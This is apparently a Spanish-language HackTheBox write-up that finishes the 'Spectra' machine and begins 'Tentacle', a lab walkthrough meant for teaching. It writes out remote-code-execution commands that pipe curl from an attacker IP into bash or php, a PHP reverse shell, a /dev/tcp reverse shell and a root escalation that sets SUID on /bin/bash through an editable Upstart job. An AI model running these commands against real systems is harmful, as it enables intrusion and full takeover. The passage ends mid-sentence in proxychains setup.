ahora en la web (podemos pasar los comandos a URL Encode para evitar errores de concatenaci√≥n y sintaxis) le indicamos que nos descargue ese archivo y a la vez nos lo ejecute con bash: &lt;!-- Sin URL encode --&gt;xmd=curl http://10. 10. 14. 194:8000/rerere. sh | bash&lt;!-- URL Encode --&gt;xmd=curl%20http%3A%2F%2F10. 10. 14. 194%3A8000%2Frerere. sh%20%7C%20bashPero al ejecutar no pasa nada, prob√© cambiando el path de bash, jugando con sh (pueden validar que shells hay activas en la m√°quina visitando el archivo /etc/shells), moviendo el archivo a /tmp y despues ejecut√°ndolo, pero nada‚Ä¶  Moving files with cURL. Asi que record√© que pentest monkey tiene una Reverse Shell con PHP, probando con ella logramos obtener la Shell (:  pentestmonkey / php-reverse-shell. Descargamos el archivo y modificamos dentro de √©l los campos ip y port por los nuestros: . . . $ip = '10. 10. 14. 194'; // CHANGE THIS$port = 4433;    // CHANGE THIS. . . Ahora simplemente le indicamos que nos haga una petici√≥n a ese archivo, pero como plus le indicamos que su contenido lo interprete con PHP: &lt;!-- Sin URL encode --&gt;xmd=curl http://10. 10. 14. 194:8000/phpr. php | php&lt;!-- URL encode --&gt;xmd=curl%20http%3A%2F%2F10. 10. 14. 194%3A8000%2Fphpr. php%20%7C%20phpY en nuestro nc tenemos: Perfecto, ahora si tenemos una Shell (: Pueeeees, a enumerar‚Ä¶  Realizando tratamiento de la TTY con ayuda de S4vitar. ‚Ä¶ (Validando el porqu√© no pudimos obtener RCE mediante bash ni nc) bash-4. 3$ which ncwhich: no nc in ((null))bash-4. 3$ locate nclocate: can not stat () `/usr/local/db/mlocate/mlocate. db': Permission deniedbash-4. 3$ ncbash: nc: command not foundbash-4. 3$ bash -i &gt;&amp; /dev/tcp/10. 10. 14. 194/4434 0&gt;&amp;1bash: /dev/tcp/10. 10. 14. 194/4434: No such file or directoryEn todos obtuvimos errores, por eso no hab√≠a ninguna ejecuci√≥n :( La flag del user esta en el usuario katie: ‚Ä¶ Movimiento lateral #: Enumerando nos encontramos con un archivo raro en la ruta /opt/autologin. conf. orig: nginx@spectra:/opt$ cat autologin. conf. orig # Copyright 2016 The Chromium OS Authors. All rights reserved. # Use of this source code is governed by a BSD-style license that can be# found in the LICENSE file. description   Automatic login at boot author     chromium-os-dev@chromium. org # After boot-complete starts, the login prompt is visible and is accepting# input. start on started boot-completescript passwd= # Read password from file. The file may optionally end with a newline.  for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do  if [ -e  ${dir}/passwd  ]; then   passwd= $(cat  ${dir}/passwd )    break  fi done if [ -z  ${passwd}  ]; then  exit 0 fi # Inject keys into the login prompt.  # # For this to work, you must have already created an account on the device.  # Otherwise, no login prompt appears at boot and the injected keys do the # wrong thing.  /usr/local/sbin/inject-keys. py -s  ${passwd}  -k enterend scriptInspeccionando nos indica que esta tomando una password de un archivo llamado passwd de las rutas /mnt/stateful_partition/etc/autologin y /etc/autologin, si comprobamos esas rutas buscando el dichoso archivo, lo encontramos en /etc/autologin: nginx@spectra:/opt$ ls -la /etc/autologintotal 12drwxr-xr-x 2 root root 4096 Feb 3 16:43 . drwxr-xr-x 63 root root 4096 Feb 11 10:24 . . -rw-r--r-- 1 root root  19 Feb 3 16:43 passwdnginx@spectra:/opt$ cat /etc/autologin/passwd SummerHereWeCome!!Jmmm, pues tenemos una ‚Äúcontrase√±a‚Äù, si probamos su katie nos da un error: nginx@spectra:/opt$ su katiesu: error while loading shared libraries: libpam. so. 2: cannot open shared object file: No such file or directoryPero si recordamos, tenemos el puerto 22 abierto: LOL, pues somos katie, super raro el encontrar la pw as√≠‚Ä¶ ‚Ä¶ Escalada de privilegios #: Estamos en un grupo llamado developers, tenemos archivos relacionados con root y katie: katie@spectra ~ $ iduid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers)katie@spectra ~ $ find / -group developers -ls 2&gt;/dev/null  32121   4 -rw-rw----  1 root   developers   478 Jun 29 2020 /etc/init/test6. conf  32123   4 -rw-rw----  1 root   developers   478 Jun 29 2020 /etc/init/test7. conf  32109   4 -rw-rw----  1 root   developers   478 Jun 29 2020 /etc/init/test3. conf  32112   4 -rw-rw----  1 root   developers   478 Jun 29 2020 /etc/init/test4. conf  32103   4 -rw-rw----  1 root   developers   478 Jun 29 2020 /etc/init/test. conf  32126   4 -rw-rw----  1 root   developers   478 Jun 29 2020 /etc/init/test8. conf  32128   4 -rw-rw----  1 root   developers   478 Jun 29 2020 /etc/init/test9. conf  32106   4 -rw-rw----  1 root   developers   478 Jun 29 2020 /etc/init/test10. conf  32108   4 -rw-rw----  1 root   developers   478 Jun 29 2020 /etc/init/test2. conf  32120   4 -rw-rw----  1 root   developers   478 Jun 29 2020 /etc/init/test5. conf  32105   4 -rw-rw----  1 root   developers   478 Jun 29 2020 /etc/init/test1. conf  23762   4 drwxr-xr-x  2 root   developers   4096 Jun 29 2020 /srv  23763   4 -rwxrwxr-x  1 root   developers   251 Jun 29 2020 /srv/nodetest. jsTambi√©n nos damos cuenta enumerando los permisos de katie como administrador del sistema (sudo -l) que puede ejecutar un binario: katie@spectra ~ $ sudo -lUser katie may run the following commands on spectra:  (ALL) SETENV: NOPASSWD: /sbin/initctlkatie@spectra ~ $ initctl allows a system administrator to communicate and interact with the Upstart init daemon.    manpages. ubuntu - initctl.   Upstart es un reemplazo basado en eventos para el daemon init, el m√©todo utilizado por varios sistemas operativos Unix-like para realizar tareas durante el arranque del sistema.    Wikipedia - Upstart.   M√°s info de Upstart y su gesti√≥n de tareas en el arranque.  Un post que me encanto por como se estructur√≥ el uso de los archivos . conf. Vale, si vemos algunos de los archivos . conf (archivos de configuraci√≥n de tareas) y los comparamos entre s√≠, vemos que todos tienen el mismo contenido, asi que elijamos por ejemplo el archivo /etc/init/test9. conf para trabajar: katie@spectra /etc/init $ cat test9. conf description  Test node. js server author    katie start on filesystem or runlevel [2345]stop on shutdownscript  export HOME= /srv   echo $$ &gt; /var/run/nodetest. pid  exec /usr/local/share/nodebrew/node/v8. 9. 4/bin/node /srv/nodetest. jsend scriptpre-start script  echo  [`date`] Node Test Starting  &gt;&gt; /var/log/nodetest. logend scriptpre-stop script  rm /var/run/nodetest. pid  echo  [`date`] Node Test Stopping  &gt;&gt; /var/log/nodetest. logend scriptEntonces tenemos:  Simplemente cada vez que se inicia la tarea, esta ejecuta el script /srv/nodetest. js mediante el binario node.  Y guarda un log una vez es iniciado (con su hora y fecha) y una vez es finalizado (tambi√©n con hora y fecha). Si miramos el script (/srv/nodetest. js) que ejecuta entendemos que significa el puerto 8081 que vimos en nuestro escaneo inicial: var http = require( http );http. createServer(function (request, response) {  response. writeHead(200, {'Content-Type': 'text/plain'});   response. end('Hello World\n');}). listen(8081);console. log('Server running at http://127. 0. 0. 1:8081/');Ya que esta levantando un servidor web en ese puerto‚Ä¶ Lo que quiere decir que cada vez que alg√∫n testX. conf esta activo, tendr√≠amos el puerto 8081 abierto. Para ver que jobs est√°n activos de los que nos interesan (testX. conf) podemos ejecutar: katie@spectra /etc/init $ sudo /sbin/initctl list | grep testtest stop/waitingtest1 stop/waitingtest7 stop/waitingtest6 stop/waitingtest5 stop/waitingtest4 stop/waitingtest10 stop/waitingtest9 stop/waitingtest8 stop/waitingtest3 stop/waitingtest2 stop/waitingPara iniciar o detener simplemente indicamos start o stop respectivamente y el nombre del job. Entonces sabemos que podemos ejecutar este comando como usuario administrador del sistema, adem√°s sabemos que podemos modificar los archivos, ya que su grupo es el grupo developers, en el cual estamos nosotros. Asi que podemos probar a guardar el input del id en el mismo archivo . log y asi corroborar que somos root y que tenemos ejecucion de comandos, d√©mosle a ver: katie@spectra /etc/init $ cat test9. conf . . . pre-start script  echo  [`date`] Node Test Starting  &gt;&gt; /var/log/nodetest. log  id &gt;&gt; /var/log/nodetest. logend script. . . Entonces, cuando hagamos start guardara la cadena de texto, pero adem√°s (si todo va bien) guardara el id del usuario que ejecuta la tarea (en este caso root al hacer uso de sudo): katie@spectra /etc/init $ sudo /sbin/initctl start test9test9 start/running, process 4684Yyyyy: katie@spectra /etc/init $ cat /var/log/nodetest. log[Tue Mar 9 16:41:30 PST 2021] Node Test Startinguid=0(root) gid=0(root) groups=0(root)Perfecto, peeeeeeeeeeeeeerfecto, con esto ya podr√≠amos directamente ver la flag, pero intentemos obtener una Shell (aun teniendo en cuenta los problemitas que puso bash al inicio). Para esto podemos otorgarle el permiso SUID a la bash que tenemos, asi despues simplemente indicar√≠amos bash -p (para que atienda al privilegio del SUID) y cambiar√≠amos la Shell inicial (katie) a la que esta ejecutando root:  Asignando SUID a la bash para convertirnos en root - S4vitar lo explica tambi√©n :P.  Los binarios SUID permiten a los usuarios ejecutar un archivo ejecutable con los permisos del archivo ejecutable o el propietario del grupo.    Permiso s en un objeto linux.  Entonces, primero validemos como esta el binario /bin/bash antes de asignarle el permiso SUID: katie@spectra /etc/init $ ls -la /bin/bash-rwxr-xr-x 1 root root 551984 Dec 22 05:46 /bin/bash# Tiene el permiso 755, pero faltaria el 4 (que es el SUID)En estos momentos no podemos hacer nada con esa bash, ya que se ejecutar√≠a una sesi√≥n dependiendo el usuario que lo ejecute, no el propietario‚Ä¶ Vamos al archivo job y agregamos: . . . pre-start script  echo  [`date`] Node Test Starting  &gt;&gt; /var/log/nodetest. log  chmod 4755 /bin/bashend script. . . Y ejecutamos: katie@spectra /etc/init $ sudo /sbin/initctl start test9Y si validamos ahora el binario /bin/bash: Perfecto, para validar lo que hicimos simplemente ejecutar√≠amos el binario, pero con el par√°metro -p para que tome el SUID: katie@spectra /etc/init $ /bin/bashbash-4. 3$ whoamikatiebash-4. 3$ exitkatie@spectra /etc/init $ /bin/bash -pbash-4. 3# whoamirootListones, solo nos quedar√≠a ver las flags :P ‚Ä¶ Wenoo, la parte de la contrase√±a de katie me pareci√≥ realmente rara y medio fea (aunque parece algo ‚Äúreal‚Äù del entorno chronium-os), pero por lo dem√°s me gusto, fue la primera vez que jugu√© con la asignaci√≥n del permiso SUID al binario /bin/bash y que lo documento, asi que una nueva cosita que queda plasmada (: Muchas gracias por leer y como siempre, a romper todo, bless y feliz vida. "
    }, {
    "id": 39,
    "url": "http://localhost:4000/htb/tentacle",
    "title": "HackTheBox - Tentacle",
    "body": "2021/06/19 - M√°quina Linux nivel dif√≠cil (pareci√≥ insana eh!). Nos toparemos con varios dominios escondidos, jugaremos con proxychains para encadenarnos, enumeraremos IPs fantasmas y explotaremos una de ellas que esta corriendo OpenSMTPD. Seguiremos saltando ahora con Kerberos, jugaremos, moveremos, modificaremos y crearemos cositas con √©l para ser root.  TL;DR (Spanish writeup): Creada por: polarbearer. Bueno bueno, vamo a juga‚Ä¶ Locura de m√°quina, inicialmente exploraremos con dig y dnsenum para encontrar unos dominios (jugando con wordlist). Al tener un proxy en la m√°quina tendremos que usarlo para saltar a nuevos proxys (relacionados con los dominios que encontramos), nos apoyaremos de proxychains para esta tarea. Jugaremos con √©l para ejecutar escaneos con nmap sobre cada una de las redes que nos vamos encontrando. Finalmente llegaremos a un host el cual tiene el puerto 80 abierto, usando fuzz encontraremos un archivo de configuraci√≥n wpad. dat el cual contiene los segmentos que se le deben asignar a los clientes cuando se conecten a la red. De ese archivo tendremos un nuevo segmento de IPs, usando nmap veremos cu√°les est√°n activas y que puertos est√°n corriendo. Nos toparemos con una m√°quina que esta sirviendo el puerto 25 (SMTP) con el software OpenSMTPD el cual tiene una vulnerabilidad de ejecuci√≥n remota de comandos, nos aprovecharemos de ella para establecer una Reverse Shell en la m√°quina smtp, todo esto mediante proxychains. Estando en la m√°quina smtp (como root) nos encontraremos un archivo de configuraci√≥n SMTP, tiene unas credenciales que nos servir√°n para logearnos como el usuario j. nawazaka en el servidor host‚Ä¶ Pero para ejecutar esta tarea nos apoyaremos del servicio kerberos, generaremos los respectivos dominios y servidores, asi mismo generaremos el ticket granting-ticket para poder establecer la conexi√≥n e ingresar al sistema‚Ä¶ Despues de este proceso tendremos una Shell mediante SSH como el usuario j. nakazawa en el servidor host. Debemos pivotear al usuario admin, enumerando veremos que hay un script el cual genera un backup de todo el contenido de la ruta /var/log/squid/ sobre la ruta /home/admin, nos aprovecharemos de esto para mediante el archivo . k5login agregar el usuario j. nakazawa‚Ä¶ (que esta en la base de datos del servidor de kerberos) a la ruta /home/admin. Este archivo permite establecer conexi√≥n al usuario de kerberos sobre la sesi√≥n del usuario que contiene el archivo, en este caso el objeto quedo en el home de admin, por lo tanto usando SSH podremos logearnos como admin y obtener una sesi√≥n. Finalmente el usuario admin tiene acceso a un archivo bastante interesante/peligroso (/etc/krb5. keytab). Jugando con los comandos de kerberos tendremos varios llamativos, usaremos algunos que nos permitir√°n jugar con los ‚Äútarget principal name‚Äù para asi crear como ‚Äútarget principal‚Äù al usuario root. Esto nos permitir√° obtener una Shell como el usuario root sobre el sistema. ‚Ä¶ Clasificaci√≥n de la m√°quina: Enumeraci√≥n a tope peeeero m√°s o menos real üòï  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo plasmar lo que hice. ‚Ä¶  Enumeraci√≥n.  Explotaci√≥n.  Movimiento Lateral.  Escalada de privilegios. ‚Ä¶ Enumeraci√≥n #: Realizaremos un escaneo de puertos para saber que servicios esta corriendo la m√°quina: ‚ù≠ nmap -p- --open -v -Pn 10. 10. 10. 224 -oG allScan      Par√°metro   Descripci√≥n         -p-   Escaneamos todos los 65535 puertos.        ‚Äìopen   Solo los puertos que est√©n abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -Pn   Evita hacer host discovery (ping)       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n de S4vitar que me permite extraer los puertos y guardarlos en la clipboard, esto para evitar copiar uno a uno (en caso de tener muchos) a mano en nuestro siguiente escaneo.    Pero este escaneo va muyyyyyyyyyyyyy lento, agregu√©mosle el par√°metro --min-rate para que nos env√≠e X numero de paquetes (el que le pongamos) por cada petici√≥n.  Con este escaneo podemos perdernos puertos, por lo tanto es mejor tambien correr el escaneo anterior sin el min-rate. En un momento veremos el resultado. ‚ù≠ nmap -p- --open -v -Pn --min-rate=2000 10. 10. 10. 224 -oG initScanVa m√°s r√°pido y obtenemos: ‚ù≠ cat initScan # Nmap 7. 80 scan initiated Tue Mar 2 25:25:25 2021 as: nmap -p- --open -v -Pn --min-rate=2000 -oG initScan 10. 10. 10. 224# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 224 ()  Status: UpHost: 10. 10. 10. 224 ()  Ports: 22/open/tcp//ssh///, 53/open/tcp//domain///   Ignored State: filtered (65533)# Nmap done at Tue Mar 2 25:25:25 2021 -- 1 IP address (1 host up) scanned in 71. 05 secondsPerfecto, nos encontramos los servicios:       Puerto   Descripci√≥n         22   SSH: Acceso remoto a servidores por medio de un canal seguro.        53   DNS: Permite la conexi√≥n tanto TCP como UDP para comunicarnos con el DNS (Domain Name System).    Hagamos un escaneo de scripts y versiones con base en cada puerto encontrado, con ello obtenemos informaci√≥n m√°s detallada de cada servicio: ‚ù≠ nmap -p 22,53 -sC -sV -Pn 10. 10. 10. 224 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos.        -sC   Muestra todos los scripts relacionados con el servicio.        -sV   Nos permite ver la versi√≥n del servicio.        -oN   Guarda el output en un archivo.    ‚ù≠ cat portScan # Nmap 7. 80 scan initiated Tue Mar 2 25:25:25 2021 as: nmap -p 22,53 -sC -sV -Pn -oN portScan 10. 10. 10. 224Nmap scan report for 10. 10. 10. 224Host is up (0. 12s latency). PORT  STATE SERVICE VERSION22/tcp open ssh   OpenSSH 8. 0 (protocol 2. 0)| ssh-hostkey: |  3072 8d:dd:18:10:e5:7b:b0:da:a3:fa:14:37:a7:52:7a:9c (RSA)|  256 f6:a9:2e:57:f8:18:b6:f4:ee:03:41:27:1e:1f:93:99 (ECDSA)|_ 256 04:74:dd:68:79:f4:22:78:d8:ce:dd:8b:3e:8c:76:3b (ED25519)53/tcp open domain ISC BIND 9. 11. 20 (RedHat Enterprise Linux 8)| dns-nsid: |_ bind. version: 9. 11. 20-RedHat-9. 11. 20-5. el8Service Info: OS: Linux; CPE: cpe:/o:redhat:enterprise_linux:8Service detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Tue Mar 2 25:25:25 2021 -- 1 IP address (1 host up) scanned in 15. 66 secondsEntonces, tenemos:       Puerto   Servicio   Versi√≥n         22   SSH   OpenSSH 8. 0 (protocol 2. 0)       53   DNS   ISC BIND 9. 11. 20 (RedHat Enterprise Linux 8)   ‚Ä¶ Validando el escaneo total (sin min-rate) nos encontramos nuevos servicios activos: ‚ù≠ nmap -p- --open -v -Pn 10. 10. 10. 224 -oG allScan‚ù≠ cat allScan# Nmap 7. 80 scan initiated Tue Mar 2 25:25:25 2021 as: nmap -p- --open -v -Pn -oG allScan 10. 10. 10. 224# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 224 ()  Status: UpHost: 10. 10. 10. 224 ()  Ports: 22/open/tcp//ssh///, 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 3128/open/tcp//squid-http///# Nmap done at Tue Mar 2 25:25:25 2021 -- 1 IP address (1 host up) scanned in 1725. 50 secondsHagamos el escaneo de versiones y relacionamos lo que encontramos: ‚ù≠ nmap -p 22,53,88,3128 -sC -sV -Pn 10. 10. 10. 224 -oN allPortScan‚ù≠ cat allPortScan # Nmap 7. 80 scan initiated Tue Mar 2 25:25:25 2021 as: nmap -p 22,53,88,3128 -sC -sV -Pn -oN allPortScan 10. 10. 10. 224Nmap scan report for 10. 10. 10. 224Host is up (0. 12s latency). PORT   STATE SERVICE   VERSION22/tcp  open ssh     OpenSSH 8. 0 (protocol 2. 0)| ssh-hostkey: |  3072 8d:dd:18:10:e5:7b:b0:da:a3:fa:14:37:a7:52:7a:9c (RSA)|  256 f6:a9:2e:57:f8:18:b6:f4:ee:03:41:27:1e:1f:93:99 (ECDSA)|_ 256 04:74:dd:68:79:f4:22:78:d8:ce:dd:8b:3e:8c:76:3b (ED25519)53/tcp  open domain    ISC BIND 9. 11. 20 (RedHat Enterprise Linux 8)| dns-nsid: |_ bind. version: 9. 11. 20-RedHat-9. 11. 20-5. el888/tcp  open kerberos-sec MIT Kerberos (server time: 2021-03-02 18:35:11Z)3128/tcp open http-proxy  Squid http proxy 4. 11|_http-server-header: squid/4. 11|_http-title: ERROR: The requested URL could not be retrievedService Info: Host: REALCORP. HTB; OS: Linux; CPE: cpe:/o:redhat:enterprise_linux:8Service detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Tue Mar 2 25:25:25 2021 -- 1 IP address (1 host up) scanned in 28. 08 secondsAhora si, que tenemos:       Puerto   Servicio   Versi√≥n         22   SSH   OpenSSH 8. 0 (protocol 2. 0)       53   DNS   ISC BIND 9. 11. 20 (RedHat Enterprise Linux 8)       88   Kerberos   MIT Kerberos (Permite a dos ordenadores en una red insegura demostrar su identidad de manera segura)       3128   Squid-Proxy   Squid http proxy 4. 11 (Servidor proxy para webs con cache)   Que destacamos: Puerto 22:  No me hab√≠a encontrado con esa versi√≥n hasta ahora, asi que puede ser interesante. Service Info:  Tenemos un dominio: realcorp. htb. ‚Ä¶ Puerto 53 (DNS) ‚åñ: Hay una herramienta muy √∫til para cuando tenemos el puerto DNS accesible llamada DIG, podemos hacer varias cosas con ella:  Dig (Domain Information Groper): Utility that performs DNS lookup by querying name servers and displaying the result to you. How to use dig command. Entonces intentara buscar dominios que resuelvan a nuestro servidor Si queremos hacer una b√∫squeda de todos los DNS v√°lidos, podemos usar ANY: ‚ù≠ dig ANY @10. 10. 10. 224; &lt;&lt;&gt;&gt; DiG 9. 16. 2-Debian &lt;&lt;&gt;&gt; ANY @10. 10. 10. 224; (1 server found);; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: SERVFAIL, id: 50996;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4096; COOKIE: e8b7300acf9dc80370fb538e603e8a54a597e579a036adfe (good);; QUESTION SECTION:;.                IN   NS;; Query time: 115 msec;; SERVER: 10. 10. 10. 224#53(10. 10. 10. 224);; WHEN: mar mar 02 25:25:25 -05 2021;; MSG SIZE rcvd: 56De ac√° nos damos cuenta de que esta respondi√©ndonos con una cookie, pero no tenemos nada m√°s‚Ä¶ Con los dem√°s argumentos obtenemos lo mismo solo que la cookie va cambiando. Buscando por internet m√°s formas de enumerar el puerto DNS nos encontramos con este post sobre algunas herramientas y en el que se toca sobre dnsenum que nos ayuda a efectuar lo mismo que dig, pero tambi√©n tiene la utilidad de encontrar subdominios que no est√°n expuestos.  Articulo del que me guie para usarlo.  Como usar dnsenum en linux. Su uso b√°sico seria: ‚ù≠ dnsenum realcorp. htb -f /usr/share/dirbuster/wordlists/directories. jbrofuzzDonde le pasamos el dominio y una wordlist para que vaya probando. Pero esta ejecucion nos da error porque no entiende hacia donde responde el dominio realcorp. htb ‚ù≠ dnsenum realcorp. htb -f /usr/share/dirbuster/wordlists/directories. jbrofuzzdnsenum VERSION:1. 2. 6-----  realcorp. htb  -----Host's addresses:__________________Name Servers:______________realcorp. htb NS record query failed: NXDOMAINViendo las opciones de la herramienta, podemos pasarle el servidor dns al que hace referencia ese dominio con el argumento --dnsserver: Vale, obtenemos un nuevo dominio e IP, pero el wordlist no nos encontr√≥ nada, intentemos modificar el wordlist por uno m√°s especializado en fuzzing de DNS: ‚ù≠ dnsenum --dnsserver 10. 10. 10. 224 realcorp. htb -f /opt/SecLists/Discovery/DNS/subdomains-top1million-110000. txtEsto toma mucho tiempo, pong√°mosle hilos y veamos la respuesta: Perfecto, finalmente conseguimos nuevos dominios y sus respectivas IPS ‚Äú ‚Äú:  ns. realcorp. htb -&gt; 10. 197. 243. 77 proxy. realcorp. htb wpad. realcorp. htb -&gt; 10. 197. 243. 31 (este se ve interesante, ya que es √∫nico)Pero intentando interactuar con alguna de esas direcciones no obtenemos respuesta‚Ä¶ Por el momento no podemos hacer nada con estos dominios‚Ä¶ Sigamos enumerando. ‚Ä¶ Puerto 88 (Kerberos) ‚åñ: Si validamos en la web a ver si nos responde algo, nos damos cuenta de que al hacer la petici√≥n intenta responder con algo, pero de una vez nos indica que no hay conexi√≥n. Si somos medio r√°pidos :P podemos frenar la petici√≥n antes de que nos muestre que no hay conexi√≥n y tendr√≠amos: Pues solo vemos el dominio que ya hab√≠amos encontrado.  REALCORP. HTBPor el momento nada m√°s‚Ä¶ ‚Ä¶ Puerto 3128 (Squid Proxy) ‚åñ: Opa, este servicio nos spoilea con algunas cosas:  Your cache administrator is j. nakazawa@realcorp. htb     Nos indica que efectivamente el dominio es realcorp. htb.    Nos da un usuario potencial.    Nos muestra un posible patr√≥n de como son creados los usuarios, inicialnombre. apellido@dominio (puede que nos sirva de algo).     Tenemos otro dominio: srv01. realcorp. htbBueno, probemos a colocar los dos dominios en el archivo /etc/hosts a ver si obtenemos algo diferente. ‚ù≠ cat /etc/hosts. . . 10. 10. 10. 224 realcorp. htb srv01. realcorp. htb. . . Pero pues seguimos obteniendo lo mismo que antes. Esto lo solucionamos pensando un toque‚Ä¶ ¬øPara qu√© tenemos el proxy? Pues precisamente para evitar estos problemitas, ya que es el intermediario entre nosotros y el dominio :P Con cURL podemos ver el ejemplo perfecto. Intentemos hacer una petici√≥n hacia el dominio encontrado: ‚ù≠ curl -v http://realcorp. htb* Trying 10. 10. 10. 224:80. . . * connect to 10. 10. 10. 224 port 80 failed: No existe ninguna ruta hasta el `host'* Failed to connect to realcorp. htb port 80: No existe ninguna ruta hasta el `host'* Closing connection 0curl: (7) Failed to connect to realcorp. htb port 80: No existe ninguna ruta hasta el `host'No obtenemos respuesta, pero si le indicamos que queremos conectarnos al dominio peeero a trav√©s del proxy (que es el que nos permite ver ese dominio): ‚ù≠ curl -v http://realcorp. htb --proxy 10. 10. 10. 224:3128* Trying 10. 10. 10. 224:3128. . . * Connected to 10. 10. 10. 224 (10. 10. 10. 224) port 3128 (#0)&gt; GET http://realcorp. htb/ HTTP/1. 1&gt; Host: realcorp. htb&gt; User-Agent: curl/7. 74. 0&gt; Accept: */*&gt; Proxy-Connection: Keep-Alive&gt;* Mark bundle as not supporting multiuse&lt; HTTP/1. 1 407 Proxy Authentication Required&lt; Server: squid/4. 11&lt; Mime-Version: 1. 0&lt; Date: Tue, 02 Mar 2021 19:28:22 GMT&lt; Content-Type: text/html;charset=utf-8&lt; Content-Length: 3552&lt; X-Squid-Error: ERR_CACHE_ACCESS_DENIED 0&lt; Vary: Accept-Language&lt; Content-Language: en&lt; Proxy-Authenticate: Basic realm= Web-Proxy &lt; X-Cache: MISS from srv01. realcorp. htb&lt; X-Cache-Lookup: NONE from srv01. realcorp. htb:3128&lt; Via: 1. 1 srv01. realcorp. htb (squid/4. 11)&lt; Connection: keep-alive&lt;&lt;!DOCTYPE html PUBLIC  -//W3C//DTD HTML 4. 01//EN   http://www. w3. org/TR/html4/strict. dtd &gt;&lt;html&gt;&lt;head&gt;&lt;meta type= copyright  content= Copyright (C) 1996-2020 The Squid Software Foundation and contributors &gt;&lt;meta http-equiv= Content-Type  content= text/html; charset=utf-8 &gt;&lt;title&gt;ERROR: Cache Access Denied&lt;/title&gt;&lt;style type= text/css &gt;&lt;!--. . . Perfecto, estamos viendo la respuesta real hacia el dominio. Nos indica Cache Access Denied‚Ä¶ Validando el final de la respuesta tenemos: &lt;/head&gt;&lt;body id=ERR_CACHE_ACCESS_DENIED&gt;&lt;div id= titles &gt;&lt;h1&gt;ERROR&lt;/h1&gt;&lt;h2&gt;Cache Access Denied. &lt;/h2&gt;&lt;/div&gt;&lt;hr&gt;&lt;div id= content &gt;&lt;p&gt;The following error was encountered while trying to retrieve the URL: &lt;a href= http://realcorp. htb/ &gt;http://realcorp. htb/&lt;/a&gt;&lt;/p&gt;&lt;blockquote id= error &gt;&lt;p&gt;&lt;b&gt;Cache Access Denied. &lt;/b&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;Sorry, you are not currently allowed to request http://realcorp. htb/ from this cache until you have authenticated yourself. &lt;/p&gt;&lt;p&gt;Please contact the &lt;a href= mailto:j. nakazawa@realcorp. htb?subject=CacheErrorInfo%20-%20ERR_CACHE_ACCESS_DENIED&amp;amp;body=CacheHost%3A%20srv01. realcorp. htb%0D%0AErrPage%3A%20ERR_CACHE_ACCESS_DENIED%0D%0AErr%3A%20%5Bnone%5D%0D%0ATimeStamp%3A%20Tue,%2002%20Mar%202021%2019%3A28%3A22%20GMT%0D%0A%0D%0AClientIP%3A%2010. 10. 14. 135%0D%0A%0D%0AHTTP%20Request%3A%0D%0AGET%20%2F%20HTTP%2F1. 1%0AUser-Agent%3A%20curl%2F7. 74. 0%0D%0AAccept%3A%20*%2F*%0D%0AProxy-Connection%3A%20Keep-Alive%0D%0AHost%3A%20realcorp. htb%0D%0A%0D%0A%0D%0A &gt;cache administrator&lt;/a&gt; if you have difficulties authenticating yourself. &lt;/p&gt;&lt;br&gt;&lt;/div&gt;&lt;hr&gt; &lt;div id= footer &gt;&lt;p&gt;Generated Tue, 02 Mar 2021 19:28:22 GMT by srv01. realcorp. htb (squid/4. 11)&lt;/p&gt;&lt;!-- ERR_CACHE_ACCESS_DENIED --&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;Al parecer necesitamos estar autenticados para poder acceder a la cache ): Jmmm, antes de seguir, intentemos ver esta respuesta en el navegador, por lo tanto vamos a configurar el proxy, en mi caso en Firefox:  Use est√° gu√≠a - whatismyip. com/what-is-a-proxy.  Le decimos cu√°l es la IP del proxy y su puerto Tambi√©n le indicamos que dominios no queremos que los procese el proxy, tales como . net, . com, . org, etc‚Ä¶Pero al intentar resolver hacia el dominio, se queda cargando y no obtenemos nada, intente quit√°ndolo del archivo /etc/hosts, pero igualmente se queda intentando resolver‚Ä¶ Asi que nada, nos quedamos con la respuesta de cURL‚Ä¶ Indagando nos encontramos con un exploit para la versi√≥n que tenemos de Squid sobre HTTP Requests Smuggling  CVE sobre la vulnerabilidad - CVE-2020-15811.  Lindo post para adentrarse en el HTTP Request Smuggling. Pero despues de probar cositas no logramos ver esto reflejado‚Ä¶ Intentando fuzzing no vemos nada tampoco. ‚Ä¶ Movimiento lateral #: En este punto estuve bastante perdido asi que decid√≠ pedir ayuda. Me indico si hab√≠a usado proxychains, si no, que le echar√° un ojo :O ‚Ä¶ Proxychains ‚åñ: Teniendo en cuenta el funcionamiento de un proxy (que ya vimos con squid). Proxychains nos permite forzar cualquier conexi√≥n a que sea manipulada entre proxies, lo que significar√≠a pivotear entre muchas IPs para que al final nuestra IP se convierta en otra totalmente diferente, esto vi√©ndolo desde la parte del anonimato, pero hablando para el caso puntual en el que necesitamos interactuar con un servicio que si o si tiene que ser hecho mediante un proxy, ac√° nos puede ayudar proxychains, adem√°s que podemos lanzar comandos (nmap por ejemplo) usando la herramienta como intermediario‚Ä¶ D√©mosle a la pr√°ctica‚Ä¶  Proxychains tutorial.  Proxing like a pro using proxychains.  We need to setup proxychains configuration file. We also need a list of proxy server. Proxychains configuration file located on /etc/proxychains. conf Proxychains tutorial. Modifiquemos el archivo /etc/proxychains. conf seg√∫n los recursos anteriores: . . . #[ProxyList]# add proxy here . . . # meanwile# defaults set to  tor #socks4     127. 0. 0. 1 9050 #Este es la configuracion por default para usar tor. Envia nuestro trafico por el puerto 